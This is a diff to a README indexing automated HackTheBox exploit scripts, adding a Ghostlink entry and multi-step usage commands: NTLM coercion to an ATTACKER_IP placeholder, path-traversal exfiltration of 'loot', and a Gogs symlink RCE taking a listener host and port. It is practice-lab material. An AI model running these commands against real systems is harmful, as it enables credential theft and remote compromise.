@@ -9,6 +9,7 @@ This directory contains standalone, end-to-end automated exploit and solver scri
 | Script Name                                                            | Target / Lab                  |  Language  | Vector / Mechanism                                                                                                                                     | Writeup Link                                                           |
 | :--------------------------------------------------------------------- | :---------------------------- | :--------: | :----------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------- |
 | **[`htb_busqueda_solve.py`](./htb_busqueda_solve.py)**                 | HackTheBox — Busqueda         | `Python 3` | Searchor 2.4.0 eval() injection RCE, `.git/config` credential harvesting, SSH password reuse, and relative path hijack of sudo `/opt/scripts/system-checkup.py`. | [Read Writeup](https://asbawy.github.io/writeups/htb-busqueda)         |
+| **[`Ghostlink_scripts/`](./Ghostlink_scripts/)**                       | HackTheBox — Ghostlink        | `Python 3` | Modular exploit toolkit: MQTT NTLM coercion, custom thread-locked HTTP relay bridge, double URL-encoded traversal, KeePass extraction, Gogs CVE-2025-8110 symlink RCE, and ADCS ESC11. | [Read Writeup](https://asbawy.github.io/writeups/htb-ghostlink)        |
 | **[`htb_hexecution_solve.py`](./htb_hexecution_solve.py)**             | HackTheBox — Hexecution       | `Python 3` | Automated custom VM (`cook`) assembly (`recipe.asm`) parsing, AES256 bytecode extraction, 2-stage permutation inversion, and full Python VM emulation. | [Read Writeup](https://asbawy.github.io/writeups/htb-hexecution)       |
 | **[`htb_neural_detonator_solve.py`](./htb_neural_detonator_solve.py)** | HackTheBox — Neural Detonator | `Python 3` | Automated `.keras` extraction, Lambda layer base64+marshal bytecode disassembly, SHA-1 weight key derivation, and Dense bias stego flag decryption.    | [Read Writeup](https://asbawy.github.io/writeups/htb-neural-detonator) |
 | **[`htb_nexus_solve.py`](./htb_nexus_solve.py)**                       | HackTheBox — Nexus            | `Python 3` | Gitea git history DB credential leak, Krayin CRM TinyMCE file upload RCE, production `.env` password harvest, SSH reuse, and root gitea-template-sync timer traversal via crafted git `..` tree objects. | [Read Writeup](https://asbawy.github.io/writeups/htb-nexus)            |
@@ -25,6 +26,27 @@ Execute the end-to-end automated exploit against the target IP:
 
 ```bash
 python3 htb_busqueda_solve.py <TARGET_IP>
+```
+
+### HackTheBox — Ghostlink (`Ghostlink_scripts/`)
+
+Follow the multi-stage exploit workflow in [`Ghostlink_scripts/`](./Ghostlink_scripts/):
+
+```bash
+# 1. Coerce svc_canary NTLM over MQTT
+python3 Ghostlink_scripts/mqtt_trigger.py http://<ATTACKER_IP>/
+
+# 2. Run local relay bridge proxy with ntlmrelayx
+# (See Ghostlink_scripts/README.md for bridge installation)
+
+# 3. Exfiltrate loot via double-encoded path traversal
+python3 Ghostlink_scripts/traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip
+
+# 4. Inspect registry hive
+python3 Ghostlink_scripts/hive_inspect.py loot/ntuser.dat
+
+# 5. Gogs Symlink RCE (CVE-2025-8110)
+python3 Ghostlink_scripts/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P '<PASSWORD>' -H <LHOST> -p <LPORT>
 ```
 
 ### HackTheBox — Hexecution (`htb_hexecution_solve.py`)
